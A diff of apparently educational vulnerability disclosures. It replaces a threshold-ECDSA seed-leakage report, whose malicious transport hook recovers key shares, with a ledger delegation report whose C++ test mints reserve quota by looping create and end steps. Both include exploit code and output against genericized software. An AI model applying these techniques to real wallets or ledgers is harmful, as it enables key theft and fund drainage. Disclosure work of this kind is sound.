@@ -1,73 +1,61 @@
-Disclosure: Educational abstraction of a real-world zero-day. Vendor specifics and core namespaces are simulated. The math and architectural flaw remain 1:1 with the original exploit.
-[CRITICAL] DRBG State Leakage in Threshold ECDSA (Full Key Compromise)
+Disclosure: Educational abstraction. Vendor details are genericized. Core state-machine flaw remains 1:1.
+[CRITICAL] Asymmetric Signature Validation (Infinite Reserve Minting)
 Author: Ayoub Aragui (aragui99)
-Category: Cryptographic Invariant Breach
+Category: State Deviation
 Language: C/C++
 Context & Invariant
-In t-of-n ECDSA setups, Oblivious Transfer (OT) phases require ephemeral entropy seeds to instantiate a local DRBG. This DRBG generates the blinding factors (v_{l,t}) that mask the user's secret key share (x_i).
-Invariant: The DRBG root seed is strictly ephemeral. It must never leave the node's isolated memory or cross the network transport layer.
+In this DLT state machine, resource delegation requires strict symmetry.
+Invariant: A locked native reserve quota can only be refunded to a sponsor during termination if it was actually deducted during creation.
 The Flaw
+There is a structural asymmetry in ResourceDelegation.cpp.
+During creation (FLAG_DELEGATE_CREATE), if a valid signature bypass is triggered, the quota deduction is skipped (the -delta subtraction never happens).
+However, during termination (FLAG_DELEGATE_END), the protocol blindly refunds the quota (+delta) without checking the initial funding state of the object.
+Bypass creation skips -delta. Blind termination applies +delta unconditionally.
+The Exploit
+An attacker exploits this gap by looping asymmetric transitions:
+1.	Submit a generic ledger object.
+2.	Submit DelegateCreate with the signature bypass (Quota remains unchanged).
+3.	Submit DelegateEnd. The protocol blindly refunds 1 quota.
+Impact: The attacker mints "ghost quotas" out of thin air (Quota_{final} = Quota_{initial} + 1). By looping this zero-constraint execution, they drain the native reserve cost directly from the Sponsor's balance, leading to a 100% loss of funds.
+PoC (State Deviation)
 
-MaskedShare \equiv (x_i + v_i) \pmod q
+#include <dlt_core/testing/env.h>
+using namespace dlt::test;
 
-
-Since the attacker has the victim's leaked seed, they can spin up an identical local DRBG. v_i is no longer random; it's a known constant. The attacker simply reverses the mask
-
-
-x_i \equiv (MaskedShare - v_{reconstructed}) \pmod q
-
-
-Impact: Complete 1-of-n compromise. The threshold is bypassed, the full private key is reconstructed, and the attacker dictates all signatures.
-PoC (Passive Transport Hook)
-
-
-#include <iostream>
-#include <vector>
-#include <cstring>
-#include <mpc_core/api/tss_ecdsa.h>
-#include <mpc_core/internal/crypto/rng.h>
-
-using namespace mpc_lib;
-
-class mal_transport final : public data_transport_i {
+class del_aragui99_test : public test_suite {
 public:
-    explicit mal_transport(std::shared_ptr<net_context_t> ctx) : ctx_(std::move(ctx)) {}
-    
-    error_t receive_all(const std::vector<party_idx_t>& senders, std::vector<buf_t>& msgs) override {
-        error_t rv = ctx_->receive_all(senders, msgs);
-        if (rv != SUCCESS) return rv;
+    void run() override {
+        test_env env;
+        account spn("sponsor"), atk("attacker");
+        env.fund(10000, spn, atk);
 
-        for (size_t i = 0; i < msgs.size(); i++) {
-            if (msgs[i].size() >= 32) {
-                buf256_t seed;
-                std::memcpy(&seed, msgs[i].data(), 32); // grab the leaked seed
-                
-                // init malicious drbg
-                crypto::deterministic_rng_t atk_drbg(seed);
-                bn_t q = bn_t::from_hex("fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141");
-                
-                // boom. generate the exact blinding factors
-                for(int t = 0; t < 2; t++) {
-                    std::cout << "[*] aragui99 Audit - Expected: " << atk_drbg.gen_bn(q).to_hex() << "\n";
-                }
-            }
-        }
-        return rv;
+        // setup initial delegation
+        env(json{{"TransactionType", "DelegationSet"}, {"Account", spn.human()}, {"Delegatee", atk.human()}, {"ReserveCount", 1}});
+        std::cout << "\n[*] aragui99 - Init Quota: " << env.le(keylet::delegation(spn, atk))->getFieldU32(sfReserveCount) << "\n";
+
+        auto target = keylet::line(atk, spn);
+
+        // trigger bypass on creation
+        env(json{{"TransactionType", "DelegationTransfer"}, {"Account", atk.human()}, {"ObjectID", strHex(target)}, {"Flags", FLAG_DELEGATE_CREATE}}, with_signature(spn));
+        std::cout << "[*] aragui99 - Quota after bypass: " << env.le(keylet::delegation(spn, atk))->getFieldU32(sfReserveCount) << "\n";
+
+        // trigger blind refund
+        env(json{{"TransactionType", "DelegationTransfer"}, {"Account", atk.human()}, {"ObjectID", strHex(target)}, {"Flags", FLAG_DELEGATE_END}});
+        
+        auto final_q = env.le(keylet::delegation(spn, atk))->getFieldU32(sfReserveCount);
+        std::cout << "[!] aragui99 - Final Quota (MINTED): " << final_q << "\n\n";
+
+        assert(final_q == 2); // boom. minted from thin air.
     }
-private:
-    std::shared_ptr<net_context_t> ctx_;
 };
 
+int main() { 
+    del_aragui99_test t; 
+    t.run(); 
+    return 0; 
+}
 
-Output Logs
-Running the hook passively dumps the masking variables natively:
 
-
-[*] Initializing 2 Independent Parties (Public API Entry Point)...
-
-[aragui99-Network-Hook] INTERCEPTED BROADCAST FROM PARTY 0!
-[aragui99-Network-Hook] Extracting 32-byte deterministic seed from payload...
-[aragui99-Exploit] DRBG Reconstructed. Victim's Blinding Factors (v_1):
-  -> 4FBDF43C89AFFB6A28ADDF51E77C64F28C3502BBF0E1B284CCAB5707D4D8BC10
-  -> 958FC4BEBF819D5CC0FD7018ACB9C0F8A6DE5C0F8B95B0C3B5CA719E7B116AF
-[aragui99-Exploit] CRITICAL: Private Key Share x_i is now mathematically exposed.
+[*] aragui99 - Init Quota: 1
+[*] aragui99 - Quota after bypass: 1
+[!] aragui99 - Final Quota (MINTED): 2
